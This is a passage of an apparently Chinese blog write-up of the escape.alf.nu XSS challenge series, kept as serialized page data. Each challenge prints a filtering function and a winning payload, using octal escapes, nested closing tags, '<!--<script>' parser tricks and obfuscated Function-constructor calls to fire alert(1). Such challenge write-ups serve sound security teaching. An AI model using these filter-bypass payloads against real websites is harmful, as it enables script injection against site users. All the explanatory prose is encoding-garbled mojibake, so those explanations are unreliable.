);\n}\n"]}]}],"\n",["$","p",null,{"children":["ç®€å•æ¥è¯´ï¼Œå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿‡æ»¤æ‰å°–æ‹¬å·ï¼Œå¼•å·ç­‰ï¼Œç„¶åå°†å¤„ç†å®Œçš„å­—ç¬¦ä¸²æ›¿æ¢æ‰æ¨¡æ¿å­—ç¬¦ä¸²ä¸­",["$","code",null,{"children":"{name}"}],"ã€‚ä½†æ˜¯ç™¾å¯†ä¸€ç–ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ç”¨8è¿›åˆ¶æˆ–è€…16è¿›åˆ¶æ¥è¡¨ç¤ºå­—ç¬¦ã€‚æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ã€‚",["$","code",null,{"children":"<"}],"å¯¹åº”çš„å…«è¿›åˆ¶æ˜¯",["$","code",null,{"children":"\\74"}],"ã€‚\nsolution(27): ",["$","code",null,{"children":"\\74iframe onload=alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"json-","children":"JSON ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  s = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/<\\/script/gi"}],", ",["$","span",null,{"className":"hljs-string","children":"''"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"');</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é“é¢˜ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚æ ¼å¼åŒ–ä¹‹åå†æŠŠ",["$","code",null,{"children":"</script"}],"æ›¿æ¢æˆç©ºä¸²ã€‚ä½¿ç”¨ä¸€ç‚¹æŠ€å·§å°±å¯ä»¥ç»•è¿‡äº†ã€‚\nsolution(35): ",["$","code",null,{"children":"</scr</scriptipt><script>alert(1)//"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"callback-","children":"Callback ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-comment","children":"// Pass inn \"callback#userdata\""}],"\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," thing = s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/#/"}],");\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (!",["$","span",null,{"className":"hljs-regexp","children":"/^[a-zA-Z\\[\\]']*$/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"])) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'Invalid callback'"}],";\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," obj = {",["$","span",null,{"className":"hljs-string","children":"'userdata'"}],": thing[",["$","span",null,{"className":"hljs-number","children":"1"}],"] };\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(obj).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\/'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"\"<script>\""}]," + thing[",["$","span",null,{"className":"hljs-number","children":"0"}],"] + ",["$","span",null,{"className":"hljs-string","children":"\"(\""}]," + json +",["$","span",null,{"className":"hljs-string","children":"\")</script>\""}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["å’Œä¸Šé¢çš„é¢˜ç›®",["$","a",null,{"href":"#Callback","children":"Callback"}],"ä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿‡æ»¤äº†",["$","code",null,{"children":"/"}],"ï¼Œä¸èƒ½ç”¨",["$","code",null,{"children":"//"}],"æ³¨é‡Šäº†è€Œå·²ï¼Œé‚£å°±æ¢ä¸€ç§æ³¨é‡Šæ–¹å¼å§\nsolution(16): ",["$","code",null,{"children":"'#';alert(1)<!--"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia-","children":"Skandia ]["}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"\nfunction escape(s) {\n  if (/[<>]/.test(s)) return '-';\n\n  return '<script>console.log(\"' + s.toUpperCase() + '\")</script>';\n}\n"}]}],"\n",["$","p",null,{"children":["é¦–å…ˆè€ƒè™‘åˆ°å¯ä»¥é—­åˆ",["$","code",null,{"children":"script"}],"æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæƒ³åˆ°ä¸Šä¸€é¢˜",["$","a",null,{"href":"#Template","children":"Template"}],"çš„æ–¹æ³•ï¼Œå³ç”¨åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ¥è¡¨ç¤ºå°–æ‹¬å·ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨è¿™é¢˜å¹¶ä¸ç®¡ç”¨ã€‚æƒ³ä¸æ˜ç™½ä¸ºç”šä¹ˆï¼Œä½†æ˜¯æµ‹è¯•ç»“æœæ˜¯ï¼šå­—ç¬¦ä¸²çš„",["$","code",null,{"children":"replace"}],"æ–¹æ³•æ˜¯è®¤ä¸å‡ºåå…­è¿›æˆ–è€…å…«è¿›åˆ¶ä»£è¡¨çš„å­—ç¬¦çš„ï¼Œä½†æ˜¯",["$","code",null,{"children":"test"}],"æ–¹æ³•å´å¯ä»¥ã€‚æ‰€ä»¥ä¸Šä¸€é¢˜Templateç”¨çš„è¿‡æ»¤æ–¹æ³•replaceè¿‡æ»¤",["$","code",null,{"children":"<"}],"æ‹¬å·æ—¶ï¼Œç”±äºæˆ‘ä»¬ç”¨äº†",["$","code",null,{"children":"\\74"}],"æ¥è¡¨ç¤ºï¼Œè€Œreplaceæ–¹æ³•å¹¶ä¸è®¤è¯†å®ƒï¼Œæ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚ä½†æ˜¯è¿™é¢˜ç”¨äº†",["$","code",null,{"children":"test"}],"æ–¹æ³•ï¼Œé¢å¯¹åŒæ ·çš„æƒ…å†µï¼Œå®ƒçŸ¥é“",["$","code",null,{"children":"\\74"}],"å³ä»£è¡¨ç€",["$","code",null,{"children":"<"}],"ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ— æ•ˆäº†ã€‚\næ—¢ç„¶ä¸èƒ½é—­åˆ",["$","code",null,{"children":"script"}],"ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘é—­åˆ",["$","code",null,{"children":"log"}],"ï¼Œåº”è¯¥æ³¨å…¥çš„payloadæ˜¯",["$","code",null,{"children":"\");alert(1)//"}],"ï¼Œä½†æ˜¯alertè½¬ä¸ºå¤§å†™å°±ä¸è¡Œäº†ã€‚æ­¤æ—¶æœ€ç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥ç”¨",["$","a",null,{"href":"http://utf-8.jp/public/jjencode.html","children":"jjencode"}],"( an online non-alphanumeric encoder)ã€‚å°†",["$","code",null,{"children":"alert(1)"}],"ç”¨jjencode encodeå¾—åˆ°çš„è½¬ç åçš„ç»“æœï¼Œç”±äºç»“æœå¤ªé•¿äº†ï¼Œæ‰€ä»¥ç”¨jjencodeä»£è¡¨ï¼Œåˆ™\nsolutioon(538)ä¸º: ",["$","code",null,{"children":"\");jjencode//"}]]}],"\n",["$","p",null,{"children":["ä½†æ˜¯538ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªé•¿äº†ã€‚åœ¨",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/","children":"pwntester"}],"çš„åšå®¢é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚\né¦–å…ˆåº”è¯¥æ³¨å…¥çš„payloadæ˜¯",["$","code",null,{"children":"\"+alert(1))//\""}],"\nä½†æ˜¯è¦æƒ³åŠæ³•ç”¨ç›¸ç­‰æ•ˆæœçš„è¯­å¥æ›¿æ¢æ‰alert(1)ã€‚\nåœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘alert(1)"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["[][",["$","span",null,{"className":"hljs-string","children":"\"sort\""}],"][",["$","span",null,{"className":"hljs-string","children":"\"constructor\""}],"](",["$","span",null,{"className":"hljs-string","children":"\"alert(1)\""}],")()\n"]}]}],"\n",["$","p",null,{"children":["è¿™ä¸ªå…³é”®åœ¨äº",["$","code",null,{"children":"Function(\"code\")"}],"ã€‚å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œè¿”å›ä¸€ä¸ªä»¥ä¼ è¿›å»çš„å­—ç¬¦ä¸²ä¸ºå‡½æ•°ä½“çš„åŒ¿åå‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä½ å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡",["$","code",null,{"children":"[]['sort']['constructor']"}],"æ¥è·å¾—è¿™ä¸ªå‡½æ•°ã€‚\n",["$","img",null,{"src":"/images/3.png","alt":""}],"\né¡ºä¾¿ç®€å•è¯´ä¸€ä¸‹ï¼Œ",["$","code",null,{"children":"[]"}],"å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œæ•°ç»„è‡ªå¸¦äº†å¾ˆå¤šæ–¹æ³•ï¼Œ",["$","code",null,{"children":"sort"}],"æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéšä¾¿ç”¨ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™é‡Œå°±ç”¨äº†sortã€‚",["$","code",null,{"children":"[][\"sort\"]"}],"çš„æ•ˆæœç›¸å½“äº",["$","code",null,{"children":"[].sort"}],"ã€‚\næ‰€æœ‰payloadå¯ä»¥æ”¹ä¸º",["$","code",null,{"children":"\"+[][\"sort\"][\"constructor\"](\"alert(1)\")())+\""}],"\næ­¤æ—¶åˆå¤šäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œç”¨ä»€ä¹ˆæ¥ä»£æ›¿ä¸Šé¢çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿ\nè¿™æ—¶å€™å°±å¯ä»¥ç”¨é¢˜ç›®Templateä¸­ç”¨åˆ°çš„æ–¹æ³•äº†ï¼Œç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿å­—æ¯ã€‚\næ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ï¼š\nsolution(99): ",["$","code",null,{"children":"\"+[][\"\\160\\157\\160\"][\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"]('\\141\\154\\145\\162\\164(1)')()+\""}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"iframe","children":"iframe"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," tag = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'iframe'"}],");\n\n  ",["$","span",null,{"className":"hljs-comment","children":"// For this one, you get to run any code you want, but in a \"sandboxed\" iframe."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"//"}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// https://4i.am/?...raw=... just outputs whatever you pass in."}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"//"}],"\n  ",["$","span",null,{"className":"hljs-comment","children":"// Alerting from 4i.am won't count."}],"\n\n  s = ",["$","span",null,{"className":"hljs-string","children":"'<script>'"}]," + s + ",["$","span",null,{"className":"hljs-string","children":"'<\\/script>'"}],";\n  tag.",["$","span",null,{"className":"hljs-property","children":"src"}]," = ",["$","span",null,{"className":"hljs-string","children":"'https://4i.am/?:XSS=0&CT=text/html&raw='"}]," + ",["$","span",null,{"className":"hljs-built_in","children":"encodeURIComponent"}],"(s);\n\n  ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"WINNING"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params"}],") { youWon = ",["$","span",null,{"className":"hljs-literal","children":"true"}],"; };\n\n  tag.",["$","span",null,{"className":"hljs-title function_","children":"setAttribute"}],"(",["$","span",null,{"className":"hljs-string","children":"'onload'"}],", ",["$","span",null,{"className":"hljs-string","children":"'youWon && alert(1)'"}],");\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," tag.",["$","span",null,{"className":"hljs-property","children":"outerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜å…¶å®ä¹ŸæŒºå¥½ç©çš„ï¼Œå¦‚æœæ¯”è¾ƒç†Ÿæ‚‰iframeçš„ç‰¹æ€§çš„è¯ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•å¾ˆå¿«å°±åšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœä¸çŸ¥é“çš„è¯ï¼Œé‚£å°±æŒºèŠ±æ—¶é—´çš„äº†ã€‚\nè¿™é¢˜å…³é”®åœ¨äºä½¿å¾—",["$","code",null,{"children":"youWon"}],"è¿™ä¸ªå˜é‡çš„å€¼ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥è§¦å‘alert(1)äº†ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸€ä¸ªURLï¼Œé¢˜ç›®æœ‰è¯´ï¼Œè¿™ä¸ªurlé¡µé¢è¿”å›çš„é¡µé¢å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´iframeçš„å†…å®¹æ˜¯ç”±æˆ‘ä»¬å†³å®šçš„ã€‚\næˆ‘ä»¬çš„è¾“å…¥ä¼šåŒ…è£¹åœ¨ä¸€ä¸ª",["$","code",null,{"children":"script"}],"æ ‡ç­¾é‡Œé¢ã€‚\nè¦åšå‡ºè¿™é“é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸¤ç‚¹iframeçš„ç‰¹æ€§"]}],"\n",["$","ol",null,{"children":["\n",["$","li",null,{"children":"iframeçš„nameå±æ€§å€¼ï¼ŒåŒæ—¶ä¼šæ³¨å…¥åˆ°çˆ¶é¡µé¢çš„å…¨å±€çª—å£å¯¹è±¡ä¸­ã€‚"}],"\n",["$","li",null,{"children":"iframeçš„nameå±æ€§ï¼Œåˆ™iframeçš„window.nameçš„å€¼åŒæ—¶ä¼šè®¾ç½®ä¸ºè¿™ä¸ªnameå±æ€§å€¼ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æœ‰ä¸ªå‰ææ—¶iframeå¹¶æ²¡æœ‰è®¾ç½®nameå±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†iframeçš„window.nameï¼ŒåŒæ—¶ä¹Ÿä¼šå°†iframeçš„nameå±æ€§å€¼è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼ˆå‰ææ˜¯å®ƒä¸å­˜åœ¨çš„è¯ï¼Œä¸èƒ½è¢«è¦†ç›–ï¼‰"}],"\n"]}],"\n",["$","p",null,{"children":["æ‰€ä»¥ï¼Œç­”æ¡ˆå‡ºæ¥äº†ã€‚\nsolution(13)ï¼š ",["$","code",null,{"children":"name='youWon'"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"tism","children":"TI(S)M"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"json"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") { ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(s).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'\\\\/'"}],"); }\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"html"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") { ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/[<>\"&]/g"}],", ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n                        ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'&#'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"charCodeAt"}],"(",["$","span",null,{"className":"hljs-number","children":"0"}],") + ",["$","span",null,{"className":"hljs-string","children":"';'"}],"; }); }\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," (\n    ",["$","span",null,{"className":"hljs-string","children":"'<script>'"}]," +\n      ",["$","span",null,{"className":"hljs-string","children":"'var url = '"}]," + ",["$","span",null,{"className":"hljs-title function_","children":"json"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"'; // We\\'ll use this later '"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'</script>\\n\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  <!-- for debugging -->\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  URL: '"}]," + ",["$","span",null,{"className":"hljs-title function_","children":"html"}],"(s) + ",["$","span",null,{"className":"hljs-string","children":"'\\n\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'<!-- then suddenly -->\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'<script>\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  if (!/^http:.*/.test(url)) console.log(\"Bad url: \" + url);\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'  else new Image().src = url;\\n'"}]," +\n    ",["$","span",null,{"className":"hljs-string","children":"'</script>'"}],"\n  );\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ç”±åˆšåˆšé‚£ä¸ªåšä¸»æä¾›çš„ã€‚åŸç†æˆ‘æš‚æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨HTML5ä¸­å¦‚æœé‡åˆ°",["$","code",null,{"children":"<!--<script>"}],"ï¼Œå°±ä¼šè®¤ä¸ºæ¥ä¸‹çš„ä»£ç æ˜¯JSä»£ç ï¼Œç›´åˆ°é‡åˆ°ç»“æŸçš„",["$","code",null,{"children":"script"}],"æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»å¾—ä¿è¯æœ‰ç›¸åº”çš„",["$","code",null,{"children":"->"}],"ï¼Œå¦åˆ™ä¼šè®¤ä¸ºè¯­æ³•å‡ºé”™çš„ã€‚\nå…·ä½“çš„å†…å®¹å¯ä»¥åˆ°åˆšåˆšé‚£ä¸ªåšä¸»é‡Œçœ‹å§ï¼Œæˆ‘å°±ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ã€‚\nsolution(25): ",["$","code",null,{"children":"if(alert(1)/*<!--<script>"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"json-â…²","children":"JSON â…¢"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s.",["$","span",null,{"className":"hljs-title function_","children":"split"}],"(",["$","span",null,{"className":"hljs-string","children":"'#'"}],").",["$","span",null,{"className":"hljs-title function_","children":"map"}],"(",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"v"}],") {\n      ",["$","span",null,{"className":"hljs-comment","children":"// Only 20% of slashes are end tags; save 1.2% of total"}],"\n      ",["$","span",null,{"className":"hljs-comment","children":"// bytes by only escaping those."}],"\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," json = ",["$","span",null,{"className":"hljs-title class_","children":"JSON"}],".",["$","span",null,{"className":"hljs-title function_","children":"stringify"}],"(v).",["$","span",null,{"className":"hljs-title function_","children":"replace"}],"(",["$","span",null,{"className":"hljs-regexp","children":"/<\\//g"}],", ",["$","span",null,{"className":"hljs-string","children":"'<\\\\/'"}],");\n      ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log('"}],"+json+",["$","span",null,{"className":"hljs-string","children":"')</script>'"}],";\n      }).",["$","span",null,{"className":"hljs-title function_","children":"join"}],"(",["$","span",null,{"className":"hljs-string","children":"''"}],");\n}\n"]}]}],"\n",["$","p",null,{"children":["åˆ©ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•å°±å¯ä»¥åšå‡ºæ¥äº†ã€‚\nsolution(29): ",["$","code",null,{"children":"<!--<script>#)/;alert(1)//-->"}],"\nåˆ†æä¸€ä¸‹è¿™ä¸ªç­”æ¡ˆã€‚\nè¾“å…¥è¿™ä¸ªç­”æ¡ˆï¼Œä¼šè¾“å…¥å¦‚ä¸‹ç»“æœï¼š"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":["<script>",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"<!--<script>\""}],")<",["$","span",null,{"className":"hljs-regexp","children":"/script><script>console.log(\")/"}],";",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-comment","children":"//-->\")</script>"}],"\n"]}]}],"\n",["$","p",null,{"children":["å› ä¸ºæˆ‘ä»¬æ³¨å…¥äº†",["$","code",null,{"children":"<!--<script>"}],"ï¼Œå¯¼è‡´parserå°†è¿™ä¸€æ®µéƒ½å½“ä½œJSæ¥å¤„ç†ã€‚"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"<!--<script>\""}],")<",["$","span",null,{"className":"hljs-regexp","children":"/script><script>console.log(\")/"}],";",["$","span",null,{"className":"hljs-title function_","children":"alert"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-comment","children":"//-->\")"}],"\n"]}]}],"\n",["$","p",null,{"children":"jså¼•æ“ä¼šè§£ææˆå¦‚ä¸‹çš„æ ·å­ï¼š"}],"\n",["$","pre",null,{"children":["$","code",null,{"children":"\nconsole.log(\"junk_string\") < /junk_regexp/ ; alert(1) // -->\n"}]}],"\n",["$","p",null,{"children":["å…¶ä¸­\njunk_stringä»£è¡¨ï¼š ",["$","code",null,{"children":"<!--<script>"}],"\njunk_regexpä»£è¡¨ï¼š ",["$","code",null,{"children":"script><script>console.log(\"\")"}],"\næˆ‘ä»¬çš„solutionä¸­æ³¨å…¥çš„å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦",["$","code",null,{"children":")/"}],"å°±ä¸ºäº†æ¬ºéª—JSå¼•æ“ï¼ŒJSå¼•æ“ä¼šå°†ä¸¤ä¸ªæ–œæ ä¹‹é—´çš„å†…å®¹å½“ä½œæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œç”¨è¿™ä¸ªåŠæ³•æ¥é—­åˆæ‰è¿™äº›å¤šä½™çš„å­—ç¬¦ã€‚"]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"skandia-â…²","children":"Skandia â…¢"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/[\\\\<>]/"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(s)) ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'-'"}],";\n\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," ",["$","span",null,{"className":"hljs-string","children":"'<script>console.log(\"'"}]," + s.",["$","span",null,{"className":"hljs-title function_","children":"toUpperCase"}],"() + ",["$","span",null,{"className":"hljs-string","children":"'\")</script>'"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["è¿™é¢˜å’Œä¸Šä¸€é¢˜",["$","code",null,{"children":"Skandia ]["}],"å·®ä¸å¤šçš„åšæ³•ã€‚ä¸è¿‡å› ä¸ºè¿‡æ»¤å¤šäº†ä¸€ä¸ªåæ–œæ†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿äº†ã€‚é‚£å°±è¦æ¢ä¸€ç§æ€è·¯ã€‚\nå…ˆæ¥çœ‹çœ‹ä¸‹é¢çš„è¡¨æ ¼ã€‚\n",["$","img",null,{"src":"/images/1.png","alt":""}],"\nè¿™é‡Œçš„è¡¨æ ¼æ˜¯è¯´ï¼Œå·¦è¾¹çš„è¾“å…¥æ˜¯å¯ä»¥è¿”å›å³è¾¹çš„å­—ç¬¦ä¸²çš„ã€‚å¤§å®¶å¯ä»¥åœ¨è¯•è¯•ã€‚\næ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•æ¥è·å–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²\n",["$","img",null,{"src":"/images/2.png","alt":""}],"\næ‰€ä»¥æœ€åçš„payload(246):"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-string","children":"\"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+\""}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],")",["$","span",null,{"className":"hljs-string","children":"\")())//`\n"}]]}]}],"\n",["$","p",null,{"children":"å¦‚æœæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯éƒ½èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æ›´çŸ­ä¸€äº›"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs 